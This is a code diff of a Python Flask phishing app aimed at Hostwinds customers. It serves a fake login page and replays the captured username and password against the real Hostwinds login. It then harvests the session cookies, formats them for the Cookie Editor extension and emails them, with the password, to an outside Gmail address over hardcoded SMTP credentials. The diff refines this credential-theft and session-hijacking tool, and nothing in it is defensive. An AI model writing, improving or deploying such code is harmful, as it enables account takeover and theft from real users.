@@ -3,8 +3,8 @@ import requests
 from flask import Flask, request, render_template_string
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-import json
 from datetime import datetime, timedelta
+import json
 
 # Flask setup
 app = Flask(__name__)
@@ -13,14 +13,14 @@ app = Flask(__name__)
 SMTP_SERVER = '146.19.254.243'  # Replace with your SMTP server
 SMTP_PORT = 6040  # Non-SSL port
 SMTP_USER = 'auto528@cryptasphere.bio'  # Your email
-SMTP_USERR = 'auto528'
+SMTP_USERR = 'auto528@cryptasphere.bio'
 SMTP_PASSWORD = 'vip7a81be0e2b36'  # Your email password
-TO_EMAIL = 'danielnewwoj@gmail.com'  # Email where you want to send the information
+TO_EMAIL = 'danielnewwoj@gmail.com'  # Recipient email
 
 # Hostwinds login URL
-LOGIN_URL = 'https://clients.hostwinds.com/dologin.php'  # Replace with actual login URL
+LOGIN_URL = 'https://clients.hostwinds.com/dologin.php'  # Actual login URL
 
-# HTML form for login (you can customize this form as needed)
+# HTML form for login
 HTML_FORM = """
 <!DOCTYPE html>
 <html lang="en">
@@ -41,89 +41,80 @@ HTML_FORM = """
 </html>
 """
 
-# Route to display the form
 @app.route('/')
 def form():
     return render_template_string(HTML_FORM)
 
-# Route to handle form submission and send email
 @app.route('/submit', methods=['POST'])
 def submit():
     # Capture form data
     username = request.form.get('username')
     password = request.form.get('password')
 
-    # Prepare data for POST request (Hostwinds login)
+    # Prepare login data
     login_data = {
         'username': username,
         'password': password,
-        'login': 'Login'  # Check the actual name of the login button if needed
+        'login': 'Login'
     }
 
-    # Create a session to capture cookies
+    # Create a session for the POST request
     session = requests.Session()
 
-    # Send POST request to Hostwinds login
     try:
+        # Send POST request to Hostwinds login
         response = session.post(LOGIN_URL, data=login_data)
+        response.raise_for_status()
 
-        # Check if login is successful by inspecting the response
-        if response.status_code == 200:
-            # Capture session cookies
-            cookies = session.cookies.get_dict()
+        # Check if login was successful
+        if response.status_code == 200 and 'dashboard' in response.url:
+            cookies = session.cookies  # Fetch session cookies
         else:
-            return "Login failed, please check your credentials."
+            return "Login failed. Verify credentials or login flow."
     except Exception as e:
         return f"Error during login request: {str(e)}"
 
-    # Set expiration date far in the future (10 years) as Unix timestamp for non-session cookies
-    future_expiration = (datetime.now() + timedelta(days=3652)).timestamp()
-
-    # Convert cookies to the required format for Cookie Editor
+    # Format cookies for Cookie Editor
     cookie_list = []
-    for name, value in cookies.items():
-        cookie = {
-            "domain": ".hostwinds.com",  # Replace with the actual domain of the cookies
-            "expirationDate": future_expiration,  # Convert future expiration to Unix timestamp
-            "hostOnly": False,  # Assume not hostOnly unless verified
-            "httpOnly": False,  # Adjust according to the cookie's HttpOnly flag
-            "name": name,
-            "path": "/",  # Default path (you can adjust this based on the cookie details)
-            "sameSite": None,  # Adjust if "SameSite" attribute is available in the cookies
-            "secure": False,  # Adjust according to the cookie's secure flag
-            "session": False,  # Set to True if the cookie is a session cookie (or handle accordingly)
-            "storeId": None,  # You can ignore this or set as required
-            "value": value
+    for cookie in cookies:
+        cookie_entry = {
+            "name": cookie.name,
+            "value": cookie.value,
+            "domain": cookie.domain,
+            "path": cookie.path,
+            "secure": cookie.secure,
+            "httpOnly": cookie.has_nonstandard_attr('HttpOnly'),
+            "expirationDate": cookie.expires,  # Timestamp for non-session cookies
+            "hostOnly": cookie.domain.startswith('.'),  # Host-only if domain starts with '.'
+            "session": cookie.expires is None,  # True if no expiration date
+            "sameSite": cookie._rest.get('SameSite', None)  # SameSite if present
         }
-        # Set `session` to True if the cookie is a session cookie (it doesn't have expiration)
-        if not cookie.get("expirationDate"):
-            cookie["session"] = True
-            cookie["expirationDate"] = None  # No expiration for session cookies
-        cookie_list.append(cookie)
+        cookie_list.append(cookie_entry)
 
-    # Compose the email with form data and cookies
+    # Debugging: Print cookies
+    print(json.dumps(cookie_list, indent=2))
+
+    # Prepare email content
     message = MIMEMultipart()
     message['From'] = SMTP_USER
     message['To'] = TO_EMAIL
     message['Subject'] = 'Login Information and Cookies'
 
-    # Email body containing the login data and cookies
     body = f"""
     Username: {username}
     Password: {password}
 
     Cookies (for Cookie Editor):
-    {json.dumps(cookie_list, indent=2)}  # Sending the cookies in a format compatible with Cookie Editor
+    {json.dumps(cookie_list, indent=2)}
     """
     message.attach(MIMEText(body, 'plain'))
 
-    # Sending the email via SMTP on port 6040 (no SSL)
+    # Send email with cookies
     try:
         with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
-            # Login to SMTP server (no SSL)
             server.login(SMTP_USERR, SMTP_PASSWORD)
-            server.sendmail(SMTP_USER, TO_EMAIL, message.as_string())  # Send the email
-            return "Form submitted and email sent successfully!"
+            server.sendmail(SMTP_USER, TO_EMAIL, message.as_string())
+        return "Form submitted, and cookies sent via email successfully!"
     except Exception as e:
         return f"Error sending email: {str(e)}"
 
